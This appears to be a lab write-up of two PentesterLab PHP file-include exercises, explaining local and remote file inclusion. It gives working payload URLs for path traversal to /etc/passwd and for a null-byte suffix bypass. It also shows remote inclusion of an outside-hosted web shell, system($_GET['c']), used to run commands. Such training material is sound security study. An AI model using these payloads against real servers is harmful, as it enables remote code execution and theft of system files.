
# Essential: File Inclue 01

## File Include Vulnerabilities

* In a lot of applications, developers need to include files to load classes or to share some templates between multiple web pages.

* `File include vulnerabilities` come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (`require`, `require_once`, `include` or `include_once` in `PHP` for example). 

* If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own `code`. 

* `File include vulnerabilities` can also be used as a `directory traversal` to read arbitrary files. However, if the arbitrary code contains an opening `PHP` tag, the file will be interpreted as `PHP` code.

* This including function can allow the loading of `local resources` or `remote resource` (a `website`, for example). If vulnerable, it will lead to:

	* `Local File Include`: `LFI`. A local file is read and interpreted.

	* `Remote File Include`: `RFI`. A remote file is retrieved and interpreted.

* By default, `PHP` `disables` loading of `remote files`, thanks to the configuration option: `allow_url_include`. In the `ISO`, it has been `enabled` to allow you to test it.

* In this first example, you can see an error message, as soon as you inject a special character (a `quote`, for example) into the parameter:

* `Warning: include(intro.php'): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'intro.php'' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7`

* If you read the error message carefully, you can extract a lot of information:

	* The path of the script: `/var/www/fileincl/example1.php`.

	* The function used: `include()`.

	* The value used in the call to `include` is the value we injected `intro.php'` without any addition or filtering.

* We can use the methods used to detect `directory traversal`, to detect `file include`. For example, you can try to include `/etc/passwd` by using the `../` technique.

* We can test for `Remote File Include`, by requesting an `external resource`: `https://pentesterlab.com/`. We will see that the page from PentesterLab gets included inside the current page.


* PentesterLab's website also contains a test for this type of vulnerability. If you use the URL [http://assets.pentesterlab.com/test_include.txt](http://assets.pentesterlab.com/test_include.txt) . You should get the result of the function `phpinfo()` within the current page:
```php
	phpinfo();
```

* Finally, to score this exercise, you can either host your own malicious script or you can use this malicious file [http://assets.pentesterlab.com/test_include_system.txt](http://assets.pentesterlab.com/test_include_system.txt) and add the command you want to run.
```php
  system($_GET['c']);
```

* You can access this exercise using the following URL: [http://ptl-ed896bae-29f8e354.libcurl.so/](http://ptl-ed896bae-29f8e354.libcurl.so/).

```php
include($_GET["page"]);
```

* you can load local files
* [http://ptl-ed896bae-29f8e354.libcurl.so/?page=../../../../../../../../../etc/passwd](http://ptl-ed896bae-29f8e354.libcurl.so/?page=../../../../../../../../../etc/passwd)

* you can load remote files
* [http://ptl-ed896bae-29f8e354.libcurl.so/?page=https://www.google.com](http://ptl-ed896bae-29f8e354.libcurl.so/?page=https://www.google.com)

* you can make your remote php code to run on the server
* [http://ptl-ed896bae-29f8e354.libcurl.so/?page=http://assets.pentesterlab.com/test_include.txt](http://ptl-ed896bae-29f8e354.libcurl.so/?page=http://assets.pentesterlab.com/test_include.txt)
* [http://ptl-ed896bae-29f8e354.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt&c=cat%20/etc/passwd](http://ptl-ed896bae-29f8e354.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt&c=cat%20/etc/passwd)

# Essential: File Inclue 02

* In a similar manner to `directory traversal`, this example adds its own suffix to the value provided. As before, you can get rid of the suffix (for `LFI`) using a `NULL BYTE`. For `RFI`, you can get rid of the suffix, by adding `&blah=` or `?blah=` depending on your `URL`.

* In this exercise, the code simulates the behaviour of `older versions` of `PHP`. `PHP` now correctly handles paths and they cannot be poisoned using a `NULL BYTE`, as they used to.

* In this code, the issue is simulated, since `PHP` solved this type of bypass since the `version 5.3.4`

* You can access this exercise using the following URL: [http://ptl-1fa9e879-1f21720d.libcurl.so/](http://ptl-1fa9e879-1f21720d.libcurl.so/) .

```php
 if ($_GET["page"]) {
    $file = $_GET["page"].".php";
    // simulate null byte issue
    $file = preg_replace('/\x00.*/',"",$file);
    include($file);

  } 
```
* [http://ptl-1fa9e879-1f21720d.libcurl.so/?page=../../../../../../../etc/passwd%00](http://ptl-1fa9e879-1f21720d.libcurl.so/?page=../../../../../../../etc/passwd%00)

* [http://ptl-1fa9e879-1f21720d.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt%00&c=cat%20/etc/passwd](http://ptl-1fa9e879-1f21720d.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt%00&c=cat%20/etc/passwd)

* [`http://ptl-1fa9e879-1f21720d.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt?blah=intro&c=cat%20/etc/passwd`](http://ptl-1fa9e879-1f21720d.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt?blah=intro&c=cat%20/etc/passwd)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 * 